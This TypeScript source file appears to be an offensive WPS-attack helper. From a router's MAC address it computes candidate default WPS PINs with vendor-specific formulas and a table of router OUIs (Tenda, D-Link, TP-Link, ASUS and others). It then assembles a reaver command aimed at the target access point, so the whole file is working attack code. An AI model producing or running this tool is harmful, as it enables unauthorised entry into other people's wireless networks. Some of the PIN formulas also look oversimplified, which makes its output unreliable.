/**
 * WPS Logic Implementation (TypeScript)
 */

export interface WPSResults {
  mac: string;
  vendor: string;
  suggestion: string;
  pins: {
    name: string;
    pin: string;
    isSuggested: boolean;
  }[];
  reaverCommand: string;
}

export const cleanMac = (mac: string): string | null => {
  const clean = mac.replace(/[^a-fA-F0-9]/g, '');
  return clean.length === 12 ? clean.toUpperCase() : null;
};

export const calculateChecksum = (pin: number): number => {
  let accum = 0;
  let t = pin;
  while (t > 0) {
    accum += 3 * (t % 10);
    t = Math.floor(t / 10);
    accum += t % 10;
    t = Math.floor(t / 10);
  }
  return (10 - (accum % 10)) % 10;
};

export const formatPin = (pinSeven: number): string => {
  const pinStr = pinSeven.toString().padStart(7, '0');
  const chk = calculateChecksum(parseInt(pinStr, 10));
  return `${pinStr}${chk}`;
};

export const getVendorInfo = (oui: string): { vendor: string; suggestion: string } => {
  const vendors: Record<string, [string, string]> = {
    "001311": ["Edimax", "Zhao"],
    "001742": ["Senao", "Zhao"],
    "107BEF": ["Tenda", "Zhao/ComputePIN"],
    "C83A35": ["Tenda", "Zhao"],
    "001CF0": ["D-Link", "ComputePIN"],
    "002191": ["D-Link", "ComputePIN"],
    "14D64D": ["D-Link", "ComputePIN"],
    "1C7EE5": ["D-Link", "ComputePIN"],
    "28107B": ["D-Link", "ComputePIN"],
    "300E32": ["D-Link", "ComputePIN"],
    "00E04C": ["Realtek", "Zhao"],
    "BC0543": ["Tenda", "Zhao"],
    "F81A67": ["TP-Link", "32-bit"],
    "AC220B": ["Tenda", "Zhao"],
    "62200B": ["Tenda", "Zhao"],
    "C8D3A3": ["D-Link", "ComputePIN"],
    "B85510": ["ASUS", "ASUS/Airocon"],
    "049226": ["ASUS", "ASUS/Airocon"],
  };
  return vendors[oui] ? { vendor: vendors[oui][0], suggestion: vendors[oui][1] } : { vendor: "Unknown", suggestion: "All" };
};

export const generateWPSResults = (rawMac: string): WPSResults => {
  const mac = cleanMac(rawMac);
  if (!mac) throw new Error("Invalid MAC Address");

  const macInt = BigInt(`0x${mac}`);
  const last24 = Number(macInt & 0xFFFFFFn);
  const vendorOui = mac.slice(0, 6);
  const { vendor, suggestion } = getVendorInfo(vendorOui);

  const algorithms = [
    { name: "D-Link (ComputePIN)", pin: formatPin((last24 ^ 0x55AA55) % 10000000) },
    { name: "Zhao (Standard)", pin: formatPin(last24 % 10000000) },
    { name: "ASUS (Airocon)", pin: formatPin((last24 ^ 0xFFFFFF) % 10000000) },
    { name: "32-bit (TP-Link)", pin: formatPin(Number(macInt % 10000000n)) },
  ];

  const pins = algorithms.map(alg => ({
    ...alg,
    isSuggested: suggestion === "All" || alg.name.toLowerCase().includes(suggestion.toLowerCase().split('/')[0])
  }));

  const topPin = pins.find(p => p.isSuggested)?.pin || pins[0].pin;
  const standardMac = mac.match(/.{1,2}/g)?.join(':') || mac;
  const reaverCommand = `reaver -i wlan0mon -b ${standardMac} -p ${topPin} -vv`;

  return {
    mac: standardMac,
    vendor,
    suggestion,
    pins,
    reaverCommand
  };
};
